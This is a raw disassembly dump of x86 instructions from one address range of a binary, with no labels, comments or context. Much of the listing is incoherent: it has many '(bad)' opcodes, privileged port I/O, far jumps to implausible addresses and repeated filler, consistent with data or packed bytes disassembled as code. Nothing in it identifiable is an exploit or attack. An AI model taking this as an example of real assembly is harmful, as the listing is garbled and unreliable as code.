  41952f:	pop    ebp
  419530:	xor    edx,DWORD PTR [edx-0x34]
  419533:	int3   
  419534:	sub    al,0x52
  419536:	int3   
  419537:	int3   
  419538:	and    al,0x52
  41953a:	int3   
  41953b:	int3   
  41953c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41953d:	xchg   ecx,eax
  41953e:	in     al,dx
  41953f:	mov    ebp,DWORD PTR [ebp-0x5274afee]
  419545:	push   cs
  419546:	dec    edi
  419547:	(bad)  
  419548:	fstp   QWORD PTR [edx-0x3c0fbead]
  41954e:	ror    ah,0x34
  419551:	push   edx
  419552:	int3   
  419553:	int3   
  419554:	sub    al,0x52
  419556:	int3   
  419557:	int3   
  419558:	and    al,0x52
  41955a:	int3   
  41955b:	int3   
  41955c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41955d:	xchg   ecx,eax
  41955e:	in     al,dx
  41955f:	adc    DWORD PTR [esi+ecx*1],0x6a
  419563:	add    BYTE PTR [edx-0xd2397fa],cl
  419569:	(bad)  
  41956a:	(bad)  
  41956b:	inc    BYTE PTR ds:0x41539f
	...
  419581:	add    al,dh
  419583:	lea    eax,[ebx-0x8]
  419586:	dec    eax
  419587:	outs   dx,DWORD PTR ds:[esi]
  419588:	add    al,BYTE PTR [eax-0x10]
  41958b:	pop    DWORD PTR [ebx-0x8]
  41958e:	and    BYTE PTR [edi-0x46],ch
  419591:	inc    edi
  419593:	fs add esp,0xfc438de8
  41959a:	imul   edx,edx,0xf
  41959d:	push   ecx
  41959e:	jnp    0x41955a
  4195a0:	or     edx,DWORD PTR [edx+0x7b]
  4195a3:	retf   0x5007
  4195a6:	lahf   
  4195a7:	mov    edx,0xc28d8bfb
  4195ac:	ror    ah,0x25
  4195af:	nop
  4195b0:	in     al,dx
  4195b1:	push   ecx
  4195b2:	scas   eax,DWORD PTR es:[edi]
  4195b3:	retf   0xfb
  4195b6:	lock push es
  4195b8:	add    bl,ch
  4195ba:	jmp    0x743dd94e
  4195bf:	inc    edi
  4195c0:	dec    DWORD PTR [eax+0x4d8962ad]
  4195c6:	pop    esp
  4195c7:	and    BYTE PTR [ebx+0x10],cl
  4195ca:	jecxz  0x4195cf
  4195cc:	mov    DWORD PTR [ebp-0x8],edx
  4195cf:	pop    es
  4195d0:	push   ebx
  4195d1:	cld    
  4195d2:	neg    DWORD PTR [edx+eax*1+0x112ad8b]
  4195d9:	dec    ebp
  4195da:	xor    al,0x14
  4195dc:	mov    dh,0x11
  4195de:	jmp    0x419628
  4195e0:	je     0x4195e9
  4195e2:	push   0x6
	...
  4195f7:	add    al,dh
  4195f9:	outs   dx,DWORD PTR ds:[esi]
  4195fa:	add    al,0xeb
  4195fc:	inc    eax
  4195fd:	sbb    al,al
  4195ff:	mov    edx,DWORD PTR ds:0x34ccc0c2
  419605:	push   ebx
  419606:	int3   
  419607:	int3   
  419608:	sub    al,0x53
  41960a:	int3   
  41960b:	int3   
  41960c:	and    al,0x53
  41960e:	int3   
  41960f:	int3   
  419610:	inc    ebp
  419611:	nop
  419612:	in     al,dx
  419613:	mov    ecx,0x708
  419618:	push   esp
  419619:	nop
  41961a:	pop    es
  41961b:	mov    ebp,esp
  41961d:	not    BYTE PTR [ebp+0x41]
  419620:	lock rol eax,0xcc
  419624:	mov    ah,0x52
  419626:	int3   
  419627:	int3   
  419628:	lods   al,BYTE PTR ds:[esi]
  419629:	push   edx
  41962a:	int3   
  41962b:	int3   
  41962c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41962d:	push   edx
  41962e:	int3   
  41962f:	int3   
  419630:	inc    ebp
  419631:	nop
  419632:	in     al,dx
  419633:	adc    DWORD PTR [esi+esi*8-0x7817ba78],0x78
  41963b:	add    al,0xf0
  41963d:	adc    eax,DWORD PTR [eax+ecx*4-0x74fff910]
  419644:	xor    eax,0xf451890f
  419649:	xchg   edx,ebp
  41964b:	or     BYTE PTR [ecx+0x64558770],ah
  419651:	pop    DWORD PTR [ebx+0x8]
  419654:	jae    0x41969c
  419656:	or     BYTE PTR [ecx+0x45c556b5],cl
	...
  41966c:	add    BYTE PTR [eax],al
  41966e:	push   esp
  41966f:	push   es
  419670:	add    BYTE PTR [eax],al
  419672:	lock outs dx,DWORD PTR ds:[esi]
  419674:	pop    es
  419675:	mov    esi,DWORD PTR [ebp-0xe3e7e9e]
  41967b:	lea    ecx,[ebx-0x4]
  41967e:	imul   edi,DWORD PTR [ecx+0x5ac53bfb],0x71
  419685:	inc    esi
  419686:	jnp    0x419651
  419688:	sti    
  419689:	mov    ebp,DWORD PTR [ebp-0x348f2aa]
  41968f:	lds    edi,FWORD PTR [esi-0x5780306]
  419695:	add    edi,DWORD PTR [ebp+0x18]
  419698:	mov    DWORD PTR [ebp-0x4],eax
  41969b:	mov    cs,WORD PTR [ebx-0x10]
  41969e:	out    0x9b,eax
  4196a0:	adc    al,0x41
  4196a2:	jno    0x419709
  4196a4:	std    
  4196a5:	(bad)  
  4196a7:	push   es
  4196a8:	xchg   DWORD PTR [ebp-0x28],edx
  4196ab:	mov    es,WORD PTR [ebx+0x8]
  4196ae:	imul   edx,esp,0xb
  4196b1:	add    edi,eax
  4196b3:	lea    edx,[ebx-0x8]
  4196b6:	jnp    0x4196c3
  4196b8:	lsl    esi,WORD PTR ds:0xe84d88f7
  4196bf:	lea    edx,[ebx+0xc]
  4196c2:	repz test DWORD PTR [eax+0x490a84d],0x89b08b0a
  4196cd:	push   ebp
  4196ce:	call   0x49da60
	...
  4196e3:	add    bl,dh
  4196e5:	les    eax,FWORD PTR [ebx]
  4196e7:	mov    DWORD PTR ds:0x7f6be70f,ebp
  4196ed:	(bad)  
  4196ee:	std    
  4196ef:	mov    ecx,DWORD PTR [ebp-0x3a333f3c]
  4196f5:	(bad)  
  4196f6:	in     al,dx
  4196f7:	adc    DWORD PTR [ebx+ebp*1-0x77],0x45
  4196fc:	call   0x6c25da90
  419701:	aam    0xe3
  419703:	mov    esp,DWORD PTR [ebp+0x451016a]
  419709:	nop
  41970a:	push   ebx
  41970b:	call   0x8c29637b
  419710:	push   0xf0000087
  419715:	(bad)  
  419716:	dec    ebx
  419717:	lock jae 0x4196fe
  41971a:	out    dx,eax
  41971b:	add    bh,ch
  41971d:	mov    bh,cl
  41971f:	add    al,dh
  419721:	push   es
  419722:	mov    DWORD PTR [ebp-0x8],edx
  419725:	add    eax,0xbc79f053
  41972a:	fisttp WORD PTR [ebx+0x788166b5]
  419730:	loopne 0x419738
  419732:	or     eax,0x6d584
  419737:	add    BYTE PTR [edx+0x7],bl
  41973a:	push   0x0
  41973c:	imul   edx,ebx,0xffffffdf
  41973f:	mov    edi,DWORD PTR ds:0xfc51010f
  419745:	mov    ah,0xfc
  419747:	adc    eax,0x0
	...
  419758:	add    BYTE PTR [eax],al
  41975a:	mov    BYTE PTR [ebx-0x3496ffc2],bh
  419760:	sti    
  419761:	mov    ebp,DWORD PTR ds:0xf0388167
  419767:	ficom  DWORD PTR [esi]
  419769:	mov    esi,DWORD PTR ds:0xe8558967
  41976f:	add    eax,0x5b3d890f
  419774:	mov    DWORD PTR [ebp-0x70],eax
  419777:	lea    ecx,[ebx+0x8]
  41977a:	repz into 
  41977c:	jns    0x182b0aaf
  419782:	imul   edi,DWORD PTR [ebx+0xeb58bdf],0x1
  419789:	inc    edx
  41978a:	add    BYTE PTR [eax-0x2c940bbd],dl
  419790:	fisttp WORD PTR [ebx+0x11010ebd]
  419796:	jns    0x419753
  419798:	jmp    0x419761
  41979a:	lods   eax,DWORD PTR ds:[esi]
  41979b:	pop    esi
  41979c:	add    BYTE PTR [eax],al
  41979e:	lock push es
  4197a0:	mov    DWORD PTR [ebp+0x50],eax
  4197a3:	test   DWORD PTR [eax+0x10],edi
  4197a6:	lock fimul DWORD PTR [ebx+ecx*4]
  4197aa:	mov    ch,0x66
  4197ac:	cmp    DWORD PTR [ecx],0xc704daf0
  4197b2:	lods   eax,DWORD PTR ds:[esi]
  4197b3:	pop    esi
  4197b4:	(bad)  
  4197b5:	push   eax
  4197b7:	push   es
  4197b8:	mov    DWORD PTR [ebp-0x4],edx
  4197bb:	test   BYTE PTR [edx],bh
	...
  4197cd:	add    BYTE PTR [eax],al
  4197cf:	add    BYTE PTR [edi+eiz*8-0x7303ba78],al
  4197d6:	or     BYTE PTR [ecx+0x7d1],al
  4197dc:	jo     0x4197b9
  4197de:	sbb    ecx,DWORD PTR [ebx+0x2895b45]
  4197e4:	or     eax,0x4ffffd60
  4197e9:	mov    bh,0x88
  4197eb:	dec    ebp
  4197ec:	les    esi,FWORD PTR [esi+0x60bdb5e7]
  4197f2:	std    
  4197f3:	sub    DWORD PTR [edi+ecx*1+0x6ccc4587],0x1c
  4197fb:	mov    edi,DWORD PTR ds:0x6b02895b
  419801:	rol    BYTE PTR [edi],cl
  419803:	lea    edi,[edi+ecx*1]
  419806:	add    dl,BYTE PTR [edx+0x7b]
  419809:	retf   0x50fb
  41980c:	cwde   
  41980d:	js     0x41980a
  41980f:	(bad)  
  419810:	jg     0x419796
  419812:	les    ecx,FWORD PTR [eax]
  419814:	imul   ecx,edx,0x5abd8bdb
  41981a:	mov    DWORD PTR [ebp+0x44],edx
  41981d:	mov    cs,WORD PTR [edi]
  41981f:	mov    esi,DWORD PTR [ebp-0x133f7ea6]
  419825:	lea    eax,[ebx-0xc]
  419828:	jnp    0x4197fc
  41982a:	jmp    0x4197af
  41982c:	xor    DWORD PTR [ebx],ecx
  41982e:	xchg   DWORD PTR [ebp+0x4c],ecx
  419831:	ins    BYTE PTR es:[edi],dx
  419832:	xchg   ebp,eax
  419833:	mov    eax,DWORD PTR [eax]
	...
  419845:	add    BYTE PTR [ebp+0x4c28166],bl
  41984b:	mov    ss,WORD PTR [ebx-0x20]
  41984e:	sbb    DWORD PTR [ecx],edx
  419850:	std    
  419851:	call   FWORD PTR [edi]
  419853:	mov    ebx,fs
  419855:	pop    ebp
  419856:	xor    edx,DWORD PTR [ebx-0x34]
  419859:	int3   
  41985a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985b:	mov    ebp,esp
  41985d:	adc    DWORD PTR [edi+ecx*1],0x68
  419861:	lock repnz (bad) 
  419864:	(bad)  
  419865:	(bad)  
  419866:	fld    QWORD PTR [esi+0x53]
  419869:	inc    ecx
  41986a:	lock lea eax,[ebx-0x8]
  41986e:	pop    eax
  41986f:	arpl   WORD PTR [edx],ax
  419871:	inc    eax
  419872:	lock mov eax,DWORD PTR [ebx-0x8]
  419876:	inc    eax
  419877:	outs   dx,DWORD PTR ds:[esi]
  419878:	ds std 
  41987a:	iret   
  41987b:	pop    edi
  41987c:	add    esp,0xfc438df8
  419882:	imul   edx,ecx,0xf
  419885:	push   ecx
  419886:	imul   edi,DWORD PTR [ecx-0x3684adf5],0x7
  41988d:	push   eax
  41988e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41988f:	mov    ecx,0xc1958bfb
  419894:	ror    ah,0xa4
  419897:	push   edx
  419898:	int3   
  419899:	int3   
  41989a:	and    eax,0xe4a1ec8c
  41989f:	mov    eax,0x6b6003e
  4198a4:	push   0x55fadd8b
  4198a9:	inc    ecx
	...
  4198ba:	add    BYTE PTR [eax],al
  4198bc:	lock lea edx,[eax+0x1]
  4198c0:	mov    ds:0xf5508843,al
  4198c5:	rol    eax,0xcc
  4198c8:	and    al,0x52
  4198ca:	int3   
  4198cb:	int3   
  4198cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198cd:	mov    ebp,esp
  4198cf:	adc    DWORD PTR [edx+edx*1-0x61],0x10
  4198d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198d5:	(bad)  
  4198d8:	and    dl,BYTE PTR [ebx]
  4198da:	(bad)  
  4198db:	ds jnp 0x4198a4
  4198de:	das    
  4198df:	mov    eax,DWORD PTR [edx-0x75]
  4198e2:	sar    BYTE PTR [esi],cl
  4198e4:	imul   ecx,esi,0xb
  4198e7:	mov    eax,DWORD PTR [edx-0x73]
  4198ea:	dec    ebx
  4198eb:	hlt    
  4198ec:	jnp    0x4198b7
  4198ee:	repz mov edi,DWORD PTR [eax-0x7b278ee]
  4198f5:	mov    dl,BYTE PTR [ebx-0x8]
  4198f8:	imul   edi,DWORD PTR [ecx+0x6f1b8fb],0x476d0000
  419902:	je     0x419948
  419904:	jae    0x4198e2
  419906:	test   DWORD PTR [eax],0xc031035d
  41990c:	fistp  DWORD PTR [ebx]
  41990e:	mov    DWORD PTR [ebp-0x38],ecx
  419911:	xchg   edx,eax
  419912:	dec    edi
  419913:	sbb    bl,bh
  419915:	mov    bl,0x7
  419917:	jne    0x4198f2
  419919:	xchg   ecx,eax
  41991a:	inc    ebx
  41991b:	clc    
  41991c:	jnp    0x4198ea
  41991e:	or     ecx,DWORD PTR [ecx+0x0]
	...
  419930:	add    BYTE PTR [eax],al
  419932:	cmp    bl,bh
  419934:	mov    BYTE PTR [ebp-0x68],dl
  419937:	xchg   edx,eax
  419938:	inc    ebx
  419939:	adc    BYTE PTR [ecx-0x37],ch
  41993c:	pop    ss
  41993d:	mov    eax,0x6f1
  419942:	fwait
  419943:	dec    DWORD PTR [eax+0xf92784d]
  419949:	mov    DWORD PTR ds:0x6845895f,ebx
  41994f:	and    al,BYTE PTR [ebx-0x4]
  419952:	fld    QWORD PTR [edx]
  419954:	xor    eax,eax
  419956:	dec    ebx
  419957:	add    ebp,ecx
  419959:	mov    bl,0x23
  41995b:	inc    edi
  41995c:	mov    ebp,esp
  41995e:	lods   eax,DWORD PTR ds:[esi]
  41995f:	dec    ecx
  419960:	int3   
  419961:	int3   
  419962:	xor    al,0x4b
  419964:	int3   
  419965:	int3   
  419966:	sub    al,0x4b
  419968:	int3   
  419969:	int3   
  41996a:	and    al,0x4b
  41996c:	int3   
  41996d:	int3   
  41996e:	lds    edx,FWORD PTR [ecx-0xeb7c14]
  419974:	les    eax,FWORD PTR [ebp+0x18]
  419977:	pop    es
  419978:	xor    BYTE PTR [eax],al
  41997a:	lock out dx,al
  41997c:	add    eax,DWORD PTR [ebx]
  41997e:	mov    al,0x6
  419980:	lahf   
  419981:	cld    
  419982:	popf   
  419983:	(bad)  
  419984:	dec    DWORD PTR [edi+0x8]
  419987:	mov    edx,0x89f7fffb
  41998c:	les    ecx,FWORD PTR [eax]
  41998e:	jns    0x419953
  419990:	repz push 0x30
  419993:	xchg   edx,eax
  419994:	dec    ebx
  419995:	clc    
	...
  4199a6:	add    BYTE PTR [eax],al
  4199a8:	inc    ecx
  4199a9:	xchg   edx,eax
  4199aa:	adc    ebx,esp
  4199ac:	cmp    eax,0x328affc8
  4199b1:	mov    bh,0x4f
  4199b3:	push   0xfffffff0
  4199b5:	pop    ebp
  4199b6:	push   ebx
  4199b7:	hlt    
  4199b8:	xchg   ebx,eax
  4199b9:	xor    dl,BYTE PTR [ebx+0x41]
  4199bc:	lock mov DWORD PTR [ebx],edi
  4199bf:	aam    0x45
  4199c1:	enter  0xffff,0x1d
  4199c5:	push   es
  4199c6:	mov    eax,0x6f002
  4199cb:	jmp    0x4199d7
  4199cd:	xchg   edx,eax
  4199ce:	or     eax,DWORD PTR [eax]
  4199d0:	repnz (bad) 
  4199d2:	dec    DWORD PTR [eax+0x685735]
  4199d8:	and    eax,0xf0680008
  4199dd:	or     BYTE PTR [eax+0x0],al
  4199e0:	jnp    0x4199d5
  4199e2:	rcl    DWORD PTR [ebp-0x4f],cl
  4199e5:	push   es
  4199e6:	jg     0x4199aa
  4199e8:	lock or BYTE PTR [eax],al
  4199eb:	add    dl,al
  4199ed:	outs   dx,BYTE PTR ds:[esi]
  4199ee:	sahf   
  4199ef:	dec    BYTE PTR [edi+0x5d]
  4199f2:	add    esp,0x2009ef4
  4199f8:	mov    al,0x6
  4199fa:	sub    eax,DWORD PTR [eax]
  4199fc:	repnz push es
  4199fe:	add    BYTE PTR [ebx+0x415332fd],cl
  419a04:	lock xor eax,ecx
  419a07:	mov    ebp,ebp
  419a09:	add    dl,BYTE PTR [esi+0x41]
	...
  419a1c:	add    BYTE PTR [eax],al
  419a1e:	lock xchg ecx,eax
  419a20:	adc    eax,DWORD PTR [esi+eiz*4]
  419a23:	(bad)  
  419a24:	call   DWORD PTR [ecx+0x51]
  419a27:	xor    dl,BYTE PTR [ebx+0x41]
  419a2a:	lock mov dh,0x88
  419a2d:	dec    ebp
  419a2e:	add    BYTE PTR [edi+0x5cec9de7],dh
  419a34:	std    
  419a35:	sub    DWORD PTR [ebx+ecx*1-0x4d3bea77],0x3e
  419a3d:	add    bl,dh
  419a3f:	mov    cl,0x7
  419a41:	mov    DWORD PTR ds:0xd855896f,esp
  419a47:	pop    esp
  419a48:	loop   0x4199d5
  419a4a:	aad    0xba
  419a4c:	ror    ah,0xa4
  419a4f:	dec    ebx
  419a50:	int3   
  419a51:	int3   
  419a52:	inc    ebp
  419a53:	nop
  419a54:	in     al,dx
  419a55:	mov    ebp,DWORD PTR ds:0xec45390f
  419a5b:	xlat   BYTE PTR ds:[ebx]
  419a5c:	add    al,0x8b
  419a5e:	sub    eax,0x9b05e90f
  419a63:	or     BYTE PTR [ecx-0x3f460bbb],cl
  419a69:	int3   
  419a6a:	lods   al,BYTE PTR ds:[esi]
  419a6b:	dec    ebx
  419a6c:	int3   
  419a6d:	int3   
  419a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a6f:	dec    ebx
  419a70:	int3   
  419a71:	int3   
  419a72:	lds    ecx,FWORD PTR [edi+0x2b5483ec]
  419a78:	lds    eax,FWORD PTR [ebp+0x5c]
  419a7b:	pop    es
  419a7c:	jo     0x419a7f
  419a7e:	lock pop DWORD PTR [ebx+0x8]
	...
  419a92:	add    BYTE PTR [eax],al
  419a94:	jns    0x419a58
  419a96:	xlat   BYTE PTR ds:[ebx]
  419a97:	mov    esi,DWORD PTR [ebp-0x17aa76c2]
  419a9d:	pop    es
  419a9e:	dec    edi
  419a9f:	cmp    al,0x69
  419aa1:	mov    dl,0xdf
  419aa3:	mov    esi,DWORD PTR [ebp-0x4748f29a]
  419aa9:	repnz mov BYTE PTR [ebp+0x10],dl
  419aad:	mov    al,BYTE PTR [edx+ecx*1-0x8]
  419ab1:	lea    eax,[ebx-0x18]
  419ab4:	cwde   
  419ab5:	repnz add BYTE PTR [eax-0x10],al
  419ab9:	(bad)  
  419aba:	or     edi,esp
  419abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419abd:	(bad)  
  419ac0:	or     ah,cl
  419ac2:	clc    
  419ac3:	(bad)  
  419ac4:	out    dx,eax
  419ac5:	xchg   esp,eax
  419ac7:	or     BYTE PTR [ecx-0x3f],bh
  419aca:	out    dx,eax
  419acb:	push   0x30
  419acd:	out    dx,eax
  419ace:	jmp    FWORD PTR [edi]
  419ad0:	lock push es
  419ad2:	push   0x64000
  419ad7:	push   0xfffffff0
  419ad9:	pop    ebx
  419ada:	push   ebx
  419adb:	lock imul eax,ecx,0x671d8be3
  419ae2:	mov    DWORD PTR [edx+0x44],eax
  419ae5:	mov    bh,0x88
  419ae7:	dec    ebp
  419ae8:	clc    
  419ae9:	mov    ch,0x88
  419aeb:	push   ebp
  419aec:	xchg   esp,eax
  419aed:	mov    eax,0x5b95c1e7
  419af2:	std    
  419af3:	xor    DWORD PTR [edx+ecx*1+0x45c5],0x0
	...
  419b07:	add    BYTE PTR [eax],al
  419b09:	add    BYTE PTR [esi+eax*1+0x0],bh
  419b0d:	add    al,dh
  419b0f:	outs   dx,DWORD PTR ds:[esi]
  419b10:	pop    es
  419b11:	mov    ebp,DWORD PTR ds:0xf1c08153
  419b17:	lea    eax,[ebx-0xc]
  419b1a:	jnp    0x419ae5
  419b1c:	fisttp WORD PTR [edi]
  419b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1f:	mov    ch,0x5
  419b21:	cmp    DWORD PTR [ebp+0x7b597152],edi
  419b27:	shl    edi,0x83
  419b2a:	enter  0xfff2,0x73
  419b2e:	mov    ch,0x8f
  419b30:	dec    ebx
  419b31:	call   0x5178a9
  419b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b37:	sbb    cl,BYTE PTR [ecx+0x428f1855]
  419b3d:	adc    BYTE PTR [ebx-0x37],ch
  419b40:	fisttp WORD PTR [ebx+0x448b1ac1]
  419b46:	loopne 0x419ba3
  419b48:	mov    DWORD PTR [ebp+0x10],ecx
  419b4b:	pop    ss
  419b4c:	shl    bh,cl
  419b4e:	sbb    DWORD PTR [edx],0xb105589
  419b54:	lods   eax,DWORD PTR ds:[esi]
  419b55:	inc    edx
  419b56:	sub    al,0xb7
  419b58:	mov    BYTE PTR [ebp-0x28],al
  419b5b:	mov    cs,WORD PTR [ebx+0x8]
  419b5e:	repz into 
  419b60:	adc    edx,DWORD PTR [ecx+0x6b]
  419b63:	mov    ah,0xe7
  419b65:	mov    esi,DWORD PTR ds:0xf4420163
  419b6b:	mov    dh,0xe7
  419b6d:	push   ebp
	...
  419b7e:	add    BYTE PTR [eax],al
  419b80:	mov    ebp,0xac83fd5a
  419b85:	or     ecx,DWORD PTR [ecx-0x407967b3]
  419b8b:	sub    BYTE PTR [ecx-0x34],bh
  419b8e:	out    0xeb,eax
  419b90:	or     BYTE PTR [esi+0x6f42e453],0xe
  419b97:	cld    
  419b98:	(bad)  
  419b99:	pop    edx
  419b9a:	add    esp,0x323eeec
  419ba0:	xor    BYTE PTR [edi],al
  419ba2:	lahf   
  419ba3:	cld    
  419ba4:	sbb    eax,0x584fffc8
  419ba9:	mov    ?,edx
  419bab:	jmp    DWORD PTR [edi-0x7a]
  419bae:	les    ecx,FWORD PTR [eax]
  419bb0:	imul   eax,esp,0x5f1583db
  419bb6:	push   ebx
  419bb7:	inc    ecx
  419bb8:	lock push es
  419bba:	jae    0x419bc6
  419bbc:	jnp    0x419bca
  419bbe:	lock push ebp
  419bc0:	mov    cl,0x6
  419bc2:	dec    edi
  419bc3:	call   FWORD PTR [ebp+0x283d813a]
  419bc9:	mov    ah,0x3e
  419bcb:	add    al,dh
  419bcd:	rcr    DWORD PTR [ebx],cl
  419bcf:	push   0xffffffb0
  419bd1:	out    dx,al
  419bd2:	jmp    FWORD PTR [edi]
  419bd4:	lock push es
  419bd6:	mov    DWORD PTR [ebp+0xc],edx
  419bd9:	mov    ch,0x88
  419bdb:	inc    ebp
  419bdc:	adc    BYTE PTR [esi+0x59a13448],cl
  419be2:	push   ebx
  419be3:	lock add BYTE PTR [eax],al
	...
  419bf6:	push   ebx
  419bf7:	xor    edx,DWORD PTR [ebx+0x41]
  419bfa:	lock ins DWORD PTR es:[edi],dx
  419bfc:	adc    ebp,DWORD PTR [edx+0x30]
  419bff:	out    dx,eax
  419c00:	jmp    FWORD PTR [edi]
  419c02:	lock push es
  419c04:	mov    DWORD PTR [ebp-0x2c],edx
  419c07:	mov    ah,0x69
  419c09:	add    bh,cl
  419c0b:	mov    bl,0xef
  419c0d:	mov    ds:0x3eb39c,eax
  419c12:	jae    0x419c2f
  419c14:	aam    0x55
  419c16:	xor    DWORD PTR [edi],eax
  419c18:	add    BYTE PTR [ebp+0x5],dh
  419c1b:	in     eax,dx
  419c1c:	aas    
  419c1d:	push   0x16f0
  419c22:	imul   eax,ebx,0xfffffffb
  419c25:	push   eax
  419c26:	or     al,BYTE PTR [edi]
  419c28:	std    
  419c29:	push   ebp
  419c2a:	and    BYTE PTR [ebp+0x73155d4],0x89
  419c31:	dec    ebp
  419c32:	xchg   esp,eax
  419c33:	(bad)  
  419c34:	dec    ebx
  419c35:	fsubr  DWORD PTR [ebx-0x4d]
  419c38:	xlat   BYTE PTR ds:[ebx]
  419c39:	mov    esi,DWORD PTR [ebp+0x2442013e]
  419c3f:	nop
  419c40:	inc    ebx
  419c41:	loopne 0x419cae
  419c43:	retf   
  419c44:	sti    
  419c45:	push   ecx
  419c46:	imul   esi,DWORD PTR [ebx+0x329152e3],0x53
  419c4d:	inc    ecx
  419c4e:	lock mov dh,0xe7
  419c51:	xchg   ebp,eax
  419c52:	cmp    al,0x59
  419c54:	std    
  419c55:	sub    DWORD PTR [edx+ecx*1],0xffffff89
  419c59:	dec    ebp
	...
  419c6a:	add    BYTE PTR [eax],al
  419c6c:	adc    BYTE PTR [ebp+0x6f0a4b7],al
  419c72:	add    BYTE PTR [eax],al
  419c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c75:	sbb    al,0x89
  419c77:	push   ebp
  419c78:	adc    BYTE PTR [ebp-0x7b0c27bd],cl
  419c7e:	mov    al,ds:0x8706f000
  419c83:	inc    ebp
  419c84:	or     al,0x8d
  419c86:	dec    ebx
  419c87:	loopne 0x419cf4
  419c89:	repz rcl DWORD PTR [ebp+0x31],cl
  419c8d:	pop    es
  419c8e:	sub    DWORD PTR [ecx+0x1c],edx
  419c91:	mov    ss,WORD PTR [ebx]
  419c93:	add    al,0x46
  419c95:	(bad)  
  419c96:	jmp    DWORD PTR [eax+0x3eb0ec]
  419c9c:	and    BYTE PTR [ebx+ecx*1-0x39e22c],cl
  419ca3:	push   eax
  419ca4:	imul   esi,DWORD PTR [edx-0x2737ad15],0xfffffff9
  419cab:	jmp    FWORD PTR [edi+0x7b0cc484]
  419cb1:	ret    0x8bdf
  419cb4:	in     eax,dx
  419cb5:	xor    dl,BYTE PTR [ebx+0x41]
  419cb8:	lock add ecx,DWORD PTR [eax+0x28]
  419cbc:	jns    0x419cc8
  419cbe:	adc    al,0x56
  419cc0:	xor    DWORD PTR [edi],eax
  419cc2:	cmp    DWORD PTR ds:0x3eb278,0x8b2ad1f0
  419ccc:	add    eax,0x415333
	...
  419ce1:	add    al,dh
  419ce3:	mov    ah,0x9e
  419ce5:	adc    al,0xc6
  419ce7:	(bad)  
  419cea:	imul   ecx,DWORD PTR [edx],0xfffffff0
  419ced:	push   ebp
  419cee:	mov    cl,0x6
  419cf0:	dec    edi
  419cf1:	call   0x3ef7be
  419cf6:	jae    0x419d3b
  419cf8:	or     al,0x8b
  419cfa:	fnsave [edx]
  419cfc:	push   ebx
  419cfd:	inc    ecx
  419cfe:	lock mov ah,0xe7
  419d01:	dec    ecx
  419d02:	sub    DWORD PTR [eax-0x3],ebx
  419d05:	xor    DWORD PTR [ebx+eax*1],0xffffffe9
  419d09:	popa   
  419d0a:	mov    BYTE PTR [edx],dl
  419d0c:	add    DWORD PTR [eax-0x10],eax
  419d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d10:	cld    
  419d11:	push   ebp
  419d12:	mov    cl,0x6
  419d14:	push   eax
  419d15:	call   0x3efabe
  419d1a:	jae    0x419d5f
  419d1c:	or     BYTE PTR [ecx+0xd893335],cl
  419d22:	mov    esp,0x41003eb1
  419d27:	mov    WORD PTR [ebx-0x20],ss
  419d2a:	xchg   ecx,eax
  419d2b:	xor    dl,BYTE PTR [ebx+0x41]
  419d2e:	lock add eax,DWORD PTR [edx+0x28]
  419d32:	and    BYTE PTR [ebx+ecx*1-0x39da10],cl
  419d39:	push   eax
  419d3a:	enter  0xfc27,0xff
  419d3e:	scas   eax,DWORD PTR es:[edi]
  419d3f:	add    esp,0xc
  419d42:	jnp    0x419d35
  419d44:	out    dx,eax
  419d45:	push   ebp
	...
  419d56:	add    BYTE PTR [eax],al
  419d58:	xor    DWORD PTR [edi],eax
  419d5a:	jg     0x419d1e
  419d5c:	inc    eax
  419d5d:	mov    ah,0xfe
  419d5f:	(bad)  
  419d60:	jns    0x419d53
  419d62:	sbb    edx,DWORD PTR [esi+0x31]
  419d65:	pop    es
  419d66:	mov    eax,DWORD PTR [ebp+0x78]
  419d69:	mov    dh,0x69
  419d6b:	inc    eax
  419d6c:	or     al,BYTE PTR [ecx]
  419d6e:	mov    DWORD PTR ds:0x3eb10c,ecx
  419d74:	rcl    DWORD PTR [edi+0x53],0xd4
  419d78:	dec    eax
  419d79:	arpl   cx,di
  419d7b:	call   DWORD PTR [edi-0x62]
  419d7e:	(bad)  
  419d7f:	push   eax
  419d81:	push   es
  419d82:	mov    ebp,esp
  419d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d85:	inc    esp
  419d86:	add    al,0x0
  419d88:	sub    al,0x4a
  419d8a:	int3   
  419d8b:	int3   
  419d8c:	and    al,0x4a
  419d8e:	int3   
  419d8f:	int3   
  419d90:	lds    ecx,FWORD PTR [ebx+0xead8bec]
  419d96:	mov    DWORD PTR [eax+0x1c],eax
  419d99:	mov    ecx,0x4a24ccc0
  419d9e:	int3   
  419d9f:	int3   
  419da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419da1:	mov    ebp,esp
  419da3:	push   ebx
  419da4:	sahf   
  419da5:	scas   eax,DWORD PTR es:[edi]
  419da6:	mov    BYTE PTR ds:0x3eb110,bh
  419dac:	imul   edi,ecx,0xffffffeb
  419daf:	push   ebp
  419db0:	xor    DWORD PTR [edi],eax
  419db2:	mov    DWORD PTR ds:0x3ebcc8,esi
  419db8:	aas    
  419db9:	mov    ch,0x58
  419dbb:	pop    ebp
	...
  419dcc:	add    BYTE PTR [eax],al
  419dce:	mov    bl,0x43
  419dd0:	int3   
  419dd1:	int3   
  419dd2:	and    eax,0x5851ec82
  419dd7:	retf   
  419dd8:	add    BYTE PTR [eax-0x10],al
  419ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ddc:	cld    
  419ddd:	push   ebp
  419dde:	xor    DWORD PTR [edi],eax
  419de0:	push   eax
  419de1:	call   0x3eed42
  419de6:	jae    0x419e33
  419de8:	or     BYTE PTR [ecx+0x4d895335],cl
  419dee:	call   0x7b4207aa
  419df3:	cld    
